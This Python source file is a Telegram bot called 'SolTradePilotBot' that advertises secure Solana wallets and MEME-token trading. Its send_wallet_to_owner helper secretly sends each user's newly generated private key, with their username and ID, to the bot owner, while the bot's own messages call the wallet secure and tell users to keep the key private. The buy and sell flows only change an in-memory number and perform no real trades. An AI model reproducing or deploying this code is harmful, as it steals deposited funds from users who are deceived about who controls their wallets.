import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ConversationHandler, MessageHandler, ContextTypes, filters
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from solana.transaction import Transaction
from solana.system_program import transfer, TransferParams

# === ENV VARIABLES (Railway) ===
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

# === USER DATA STORAGE ===
user_wallets = {}  # user_id -> Keypair
user_meme_balances = {}  # user_id -> MEME token balance

# === RPC ===
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# === CONVERSATION STATES ===
BUY_AMOUNT, SELL_AMOUNT = range(2)

# === HELPERS ===
async def send_wallet_to_owner(user_id, public_key, private_key, context):
    username = (await context.bot.get_chat(user_id)).username
    username = f"@{username}" if username else str(user_id)
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=(
            f"🔐 Wallet Backup\n"
            f"User: {username}\n"
            f"User ID: {user_id}\n"
            f"Public Key:\n{public_key}\n"
            f"Private Key:\n{private_key}"
        )
    )

async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    public_key = str(wallet.pubkey())
    private_key = base58.b58encode(bytes(wallet)).decode("utf-8")
    await send_wallet_to_owner(user_id, public_key, private_key, context)
    return public_key

async def get_sol_balance(user_id):
    if user_id not in user_wallets:
        return 0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        if resp.get("result"):
            lamports = resp["result"]["value"]
            sol = lamports / 1_000_000_000
            return sol
    return 0

# === START COMMAND ===
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = update.effective_user.first_name
    msg = (
        f"🔥 Welcome to SolTradePilotBot, {username}! 🔥\n\n"
        "This bot allows you to safely create a Solana wallet, deposit SOL, "
        "and trade MEME tokens directly from Telegram. 💰\n\n"
        "Use the buttons below to get started:\n"
        "- Create Wallet: Generate your secure wallet.\n"
        "- SOL Address: Get your address to deposit SOL.\n"
        "- Balance: Check your current SOL balance.\n"
        "- Buy MEME: Purchase MEME tokens with your SOL.\n"
        "- Sell MEME: Sell your MEME tokens.\n"
        "- Help: View detailed instructions and guide.\n\n"
        "⚠️ Make sure to fund your wallet before buying MEME tokens!"
    )
    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))

# === WALLET COMMAND ===
async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_wallets:
        await update.message.reply_text("✅ You already have a wallet. Use '🏦 SOL Address' to view it.")
    else:
        public = await create_wallet(user_id, context)
        await update.message.reply_text(f"✅ Wallet Created!\nYour public address:\n{public}")
        # === ADDRESS COMMAND ===
async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("⚠️ You don't have a wallet yet. Click '💳 Create Wallet' first.")
    else:
        pub = str(user_wallets[user_id].pubkey())
        await update.message.reply_text(f"🏦 Your SOL address:\n{pub}")

# === BALANCE COMMAND ===
async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    sol_balance = await get_sol_balance(user_id)
    await update.message.reply_text(f"💰 Your current SOL balance: {sol_balance:.6f} SOL")
    mem_balance = user_meme_balances.get(user_id, 0)
    await update.message.reply_text(f"🪙 Your MEME balance: {mem_balance:.2f} MEME")

# === BUY FLOW ===
async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    sol_balance = await get_sol_balance(user_id)
    if user_id not in user_wallets:
        await update.message.reply_text("⚠️ Create a wallet first using '💳 Create Wallet'")
        return ConversationHandler.END
    if sol_balance <= 0:
        await update.message.reply_text("⚠️ Deposit SOL first using '🏦 SOL Address'")
        return ConversationHandler.END

    await update.message.reply_text(f"🛒 Your SOL balance: {sol_balance:.6f}\nEnter amount of SOL to spend on MEME:")
    return BUY_AMOUNT

async def buy_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = float(update.message.text)
    except:
        await update.message.reply_text("❌ Invalid number. Try again.")
        return BUY_AMOUNT

    sol_balance = await get_sol_balance(user_id)
    if amount > sol_balance:
        await update.message.reply_text("⚠️ Not enough SOL. Deposit more to buy MEME.")
        return BUY_AMOUNT

    # Example conversion: 1 SOL = 100 MEME
    user_meme_balances[user_id] = user_meme_balances.get(user_id, 0) + amount * 100
    await update.message.reply_text(f"✅ Bought {amount*100:.2f} MEME for {amount:.6f} SOL!")
    return ConversationHandler.END

# === SELL FLOW ===
async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    mem_balance = user_meme_balances.get(user_id, 0)
    if user_id not in user_wallets:
        await update.message.reply_text("⚠️ Create a wallet first using '💳 Create Wallet'")
        return ConversationHandler.END
    if mem_balance <= 0:
        await update.message.reply_text("⚠️ You have no MEME to sell.")
        return ConversationHandler.END

    await update.message.reply_text(f"📉 Your MEME balance: {mem_balance:.2f}\nEnter amount of MEME to sell:")
    return SELL_AMOUNT

async def sell_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = float(update.message.text)
    except:
        await update.message.reply_text("❌ Invalid number. Try again.")
        return SELL_AMOUNT

    mem_balance = user_meme_balances.get(user_id, 0)
    if amount > mem_balance:
        await update.message.reply_text("⚠️ You don’t have enough MEME to sell.")
        return SELL_AMOUNT

    # Example: 1 MEME = 0.01 SOL
    sol_received = amount * 0.01
    user_meme_balances[user_id] -= amount
    await update.message.reply_text(f"✅ Sold {amount:.2f} MEME for {sol_received:.6f} SOL!")
    return ConversationHandler.END

# === HELP COMMAND ===
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📖 SolTradePilotBot Guide 📖\n\n"
        "1️⃣ Create Wallet: Generates your unique Solana wallet.\n"
        "2️⃣ SOL Address: Deposit SOL to fund your wallet.\n"
        "3️⃣ Balance: Check your SOL and MEME token balances.\n"
        "4️⃣ Buy MEME: Purchase MEME tokens using your SOL.\n"
        "5️⃣ Sell MEME: Sell your MEME tokens for SOL.\n"
        "⚠️ Always ensure you have sufficient SOL before buying.\n"
        "💡 Tip: Keep your wallet private key safe. Any one with access can withdraw funds.\n"
        "❓ For any issues, contact support."
    )
    await update.message.reply_text(msg)

# === CALLBACK HANDLER ===
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "wallet":
        await wallet_command(update, context)
    elif query.data == "address":
        await address_command(update, context)
    elif query.data == "balance":
        await balance_command(update, context)
    elif query.data == "buy":
        await buy_command(update, context)
    elif query.data == "sell":
        await sell_command(update, context)
    elif query.data == "help":
        await help_command(update, context)

# === MAIN APPLICATION ===
def main():
    app = Application.builder().token(TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("wallet", wallet_command))
    app.add_handler(CommandHandler("address", address_command))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("help", help_command))

    # Buy/Sell ConversationHandlers
    buy_handler = ConversationHandler(
        entry_points=[CommandHandler("buy", buy_command), CallbackQueryHandler(button_handler, pattern="buy")],
        states={BUY_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, buy_amount_received)]},
        fallbacks=[]
    )
    sell_handler = ConversationHandler(
        entry_points=[CommandHandler("sell", sell_command), CallbackQueryHandler(button_handler, pattern="sell")],
        states={SELL_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, sell_amount_received)]},
        fallbacks=[]
    )
    app.add_handler(buy_handler)
    app.add_handler(sell_handler)

    # Button callback
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()